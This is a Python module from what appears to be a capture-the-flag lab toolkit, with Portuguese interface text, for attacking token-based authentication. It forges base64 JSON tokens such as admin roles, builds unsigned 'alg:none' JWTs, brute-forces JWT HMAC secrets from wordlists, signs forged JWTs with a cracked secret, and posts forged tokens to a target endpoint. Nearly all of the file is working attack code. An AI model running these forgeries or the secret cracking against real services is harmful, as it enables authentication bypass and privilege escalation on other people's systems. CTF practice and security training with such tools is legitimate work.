"""modules/forge.py"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from pathlib import Path

from rich.console import Console
from rich.syntax import Syntax

from ctflab.core import http as H, payloads as P
from ctflab.core.session import Session
from ctflab.cli.menu import run_menu
from ctflab.cli.ui import ask, askctx, show_response
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn


def detect_type(token: str) -> str:
    if token.count(".") == 2:
        return "JWT"
    for pad in ("", "=", "==", "==="):
        try:
            decoded = base64.b64decode(token + pad).decode("utf-8")
            json.loads(decoded)
            return "base64(JSON)"
        except Exception:
            pass
    for pad in ("", "=", "==", "==="):
        try:
            base64.b64decode(token + pad).decode("utf-8")
            return "base64(texto)"
        except Exception:
            pass
    if all(c in "0123456789abcdefABCDEF" for c in token):
        if len(token) in {32, 40, 64}:
            return f"hash hex ({len(token) * 4}bit)"
    return "desconhecido"


def _decode_jwt_part(part: str) -> dict | None:
    pad = part + "=" * (4 - len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(pad).decode())


def _analyze(s: Session, c: Console) -> None:
    token = askctx(s, "token", "token", "")
    tipo  = detect_type(token)
    c.print(f"\n[info]tipo:[/info] [warn]{tipo}[/warn]")

    if "base64" in tipo:
        for pad in ("", "=", "=="):
            try:
                c.print(f"[info]conteúdo:[/info] {base64.b64decode(token + pad).decode()}")
                break
            except Exception:
                pass
    elif tipo == "JWT":
        parts = token.split(".")
        for i, part in enumerate(parts[:2]):
            try:
                data  = _decode_jwt_part(part)
                label = ["header", "payload"][i]
                c.print(f"\n[info]JWT {label}:[/info]")
                c.print(Syntax(json.dumps(data, indent=2), "json", theme="monokai"))
            except Exception:
                pass
        c.print("\n[dim]assinatura: pode usar 'crack JWT secret' para encontrar o segredo[/dim]")


def _decode_b64(s: Session, c: Console) -> None:
    token = askctx(s, "token", "token base64", "")
    for pad in ("", "=", "==", "==="):
        try:
            c.print(f"\n[ok]{base64.b64decode(token + pad).decode()}[/ok]")
            return
        except Exception:
            pass
    c.print("[fail]não consegui decodar[/fail]")


def _encode_b64(s: Session, c: Console) -> None:
    text = ask("texto")
    c.print(f"\n[ok]{base64.b64encode(text.encode()).decode()}[/ok]")


def _forge_json_b64(s: Session, c: Console) -> None:
    raw = ask('payload JSON (ex: {"role":"admin"})')
    try:
        json.loads(raw)
    except Exception:
        c.print("[fail]JSON inválido[/fail]")
        return
    forged = base64.b64encode(raw.encode()).decode()
    c.print(f"\n[ok]token forjado:[/ok] {forged}")
    s.remember("token", forged)
    s.note(f"token forjado: {forged}")


def _forge_jwt_none(s: Session, c: Console) -> None:
    raw = ask('payload JWT (ex: {"role":"admin","sub":"1"})')
    try:
        json.loads(raw)
    except Exception:
        c.print("[fail]JSON inválido[/fail]")
        return
    header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(raw.encode()).rstrip(b"=").decode()
    token   = f"{header}.{payload}."
    c.print(f"\n[ok]JWT alg:none:[/ok] {token}")
    s.remember("token", token)
    s.note(f"JWT alg:none: {token}")


def _forge_jwt_signed(s: Session, c: Console) -> None:
    """Forja JWT assinado com segredo conhecido — útil após crack."""
    raw    = ask('payload JWT (ex: {"role":"admin","sub":"1"})')
    secret = ask("segredo HMAC")
    try:
        json.loads(raw)
    except Exception:
        c.print("[fail]JSON inválido[/fail]")
        return

    header  = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(raw.encode()).rstrip(b"=").decode()
    msg     = f"{header}.{payload}".encode()
    sig     = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    token   = f"{header}.{payload}.{sig}"

    c.print(f"\n[ok]JWT HS256 forjado:[/ok] {token}")
    s.remember("token", token)
    s.note(f"JWT HS256 forjado (secret={secret!r}): {token}")


def _crack_jwt(s: Session, c: Console) -> None:
    """
    Crack de segredo HMAC de JWT por dicionário.

    Tenta cada palavra da wordlist como segredo HS256 e compara
    a assinatura gerada com a do token original.
    """
    token = askctx(s, "token", "JWT alvo", "")
    parts = token.split(".")
    if len(parts) != 3:
        c.print("[fail]não parece um JWT (esperado header.payload.sig)[/fail]")
        return

    header_payload = f"{parts[0]}.{parts[1]}".encode()
    target_sig     = parts[2]

    wordlist_path = ask("wordlist (enter = lista interna de jwt_secrets)", "")
    if wordlist_path:
        try:
            words = Path(wordlist_path).read_text().splitlines()
        except Exception as exc:
            c.print(f"[fail]{exc}[/fail]")
            return
    else:
        words = P.load("jwt_secrets") + P.load("passwords")

    c.print(f"\n[warn]testando {len(words)} segredos...[/warn]")

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task("cracking JWT", total=len(words))
        for secret in words:
            secret = secret.strip()
            if not secret: continue
            
            prog.update(task, description=f"testando [dim]{secret[:20]}[/dim]", advance=1)
            computed = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), header_payload, hashlib.sha256).digest()
            ).rstrip(b"=").decode()

            if computed == target_sig:
                c.print(f"\n[ok]SECRET ENCONTRADO: {secret!r}[/ok]")
                s.remember("jwt_secret", secret)
                s.note(f"JWT secret cracked: {secret!r}")
                c.print("[dim]use 'forjar JWT assinado' para criar tokens com esse segredo[/dim]")
                return

    c.print("\n[fail]segredo não encontrado na wordlist[/fail]")
    c.print("[dim]tente uma wordlist maior (ex: rockyou.txt)[/dim]")


def _test_endpoint(s: Session, c: Console) -> None:
    path  = askctx(s, "path",        "path",  "/")
    field = askctx(s, "token_field", "campo", "")
    token = askctx(s, "token",       "token", "")
    r = H.post(s, path, {field: token})
    show_response(r, s.history[-1].elapsed, s)


_OPTIONS = {
    "1": ("analisar token (auto-detect)",  _analyze),
    "2": ("decodar base64",                _decode_b64),
    "3": ("encodar base64",                _encode_b64),
    "4": ("forjar JSON → base64",          _forge_json_b64),
    "5": ("forjar JWT alg:none",           _forge_jwt_none),
    "6": ("forjar JWT HS256 assinado",     _forge_jwt_signed),
    "7": ("crack JWT secret (dicionário)", _crack_jwt),
    "8": ("testar token em endpoint",      _test_endpoint),
    "0": ("voltar",                        None),
}


def run(session: Session, console: Console) -> None:
    run_menu("FORGE DE TOKEN", _OPTIONS, session, console)
